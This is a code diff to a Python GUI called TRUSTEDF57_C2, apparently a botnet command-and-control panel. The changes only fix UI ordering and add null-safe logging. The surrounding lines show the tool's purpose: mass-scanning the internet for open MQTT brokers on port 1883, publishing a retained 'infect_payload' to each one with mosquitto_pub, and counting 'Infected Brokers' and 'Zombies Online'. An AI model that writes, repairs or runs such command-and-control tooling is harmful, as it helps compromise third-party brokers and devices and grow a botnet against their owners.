@@ -28,6 +28,12 @@ class TRUSTEDF57_C2:
         self.root.geometry("1400x900")
         self.root.configure(bg='#111111')
         
+        # Create console FIRST for logging
+        self.console = None
+        self.brokers_label = None
+        self.infected_label = None
+        self.zombies_label = None
+        
         # Auto-detect REAL public IP
         self.my_ip = self.get_public_ip()
         self.c2_port = 1883
@@ -43,8 +49,8 @@ class TRUSTEDF57_C2:
         self.bots_online = 0
         self.total_zombies = 0  # Tutti i client
         
+        self.build_menu()  # Build UI FIRST
         self.setup_c2()
-        self.build_menu()
         self.mqtt_setup()
         
         self.log("🔥 TRUSTEDF57 STARTED | Public IP: " + self.my_ip)
@@ -53,11 +59,23 @@ class TRUSTEDF57_C2:
         """Auto-detect IP reale"""
         try:
             ip = requests.get('https://ifconfig.me', timeout=3).text.strip()
-            self.log(f"🌐 Public IP detected: {ip}")
+            if self.console:  # Only log if console exists
+                self.log(f"🌐 Public IP detected: {ip}")
             return ip
         except:
-            self.log("⚠️ Using local IP")
+            if self.console:
+                self.log("⚠️ Using local IP")
             return socket.gethostbyname(socket.gethostname())
+    
+    def safe_update_label(self, label, text):
+        """Safe label update - prevents AttributeError"""
+        if label:
+            label.config(text=text)
+    
+    def safe_update_stats(self):
+        """Safe stats update"""
+        self.safe_update_label(self.zombies_label, f"Zombies Online: {self.total_zombies:,} | Active: {self.bots_online}")
+        self.safe_update_label(self.infected_label, f"Infected Brokers: {self.brokers_infected}")
     
     def setup_c2(self):
         """Auto Mosquitto daemon"""
@@ -128,9 +146,10 @@ class TRUSTEDF57_C2:
         self.console.pack(fill='both', expand=True)
     
     def log(self, msg):
-        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
-        self.console.see(tk.END)
-        self.root.update_idletasks()
+        if self.console:  # Safe logging
+            self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+            self.console.see(tk.END)
+            self.root.update_idletasks()
     
     def mqtt_setup(self):
         self.client = mqtt.Client()
@@ -153,11 +172,10 @@ class TRUSTEDF57_C2:
                 self.total_zombies += clients
             except:
                 self.total_zombies += 1
-            self.update_stats()
+            self.safe_update_stats()  # Use safe version
     
     def update_stats(self):
-        self.zombies_label.config(text=f"Zombies Online: {self.total_zombies:,} | Active: {self.bots_online}")
-        self.infected_label.config(text=f"Infected Brokers: {self.brokers_infected}")
+        self.safe_update_stats()  # Use safe version
     
     def mass_scan(self):
         """MASS SCAN reale - genera brokers.txt"""
@@ -175,8 +193,9 @@ class TRUSTEDF57_C2:
             if "Discovered open port 1883" in line:
                 ip_port = line.split()[5]  # Parse IP:1883
                 self.brokers_scanned += 1
-                self.brokers_label.config(text=f"Brokers Scanned: {self.brokers_scanned}")
-                self.root.update()
+                self.safe_update_label(self.brokers_label, f"Brokers Scanned: {self.brokers_scanned}")
+                if self.root:
+                    self.root.update()
         
         self.log(f"✅ Scan completa! {self.brokers_scanned} brokers → brokers.txt")
     
@@ -219,7 +238,7 @@ done"""
                     subprocess.run(f'mosquitto_pub -h {ip} -p {port} -t "{topic}" -m "{infect_payload}" --retain -q 1', 
                                  shell=True, timeout=3, capture_output=True)
                     self.brokers_infected += 1
-                    self.update_stats()
+                    self.safe_update_stats()
                     return True
                 except:
                     continue
